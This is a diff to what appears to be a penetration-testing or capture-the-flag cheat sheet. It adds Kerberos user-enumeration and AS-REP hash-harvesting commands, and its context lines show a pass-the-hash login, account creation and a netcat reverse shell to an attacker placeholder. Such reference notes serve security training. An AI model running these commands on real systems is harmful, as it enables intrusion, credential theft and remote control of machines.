@@ -201,6 +201,16 @@ evil-winrm -i <TARGET_IP> -H <PASSWORD_HASH> -p <PASSWORD>
 net user <USER_NAME> <PASSWORD>
 ```
 
+## Active Directory and Kerberos Enumeration
+
+```bash
+./kerbrute_linux_amd64 userenum --dc <TARGET_IP> -d <TARGET_DOMAIN> users.txt
+```
+
+```BASH
+impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile users.txt -request -format hashcat -dc-ip <TARGET_IP>
+```
+
 # Steganography and Image Analysis
 
 ## Metadata Extraction
@@ -521,3 +531,4 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/
 - [GitTools](https://github.com/internetwache/GitTools)
 - [Boxentriq](https://www.boxentriq.com/)
 - [CacheSleuth](https://www.cachesleuth.com/multidecoder/)
+- [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck)
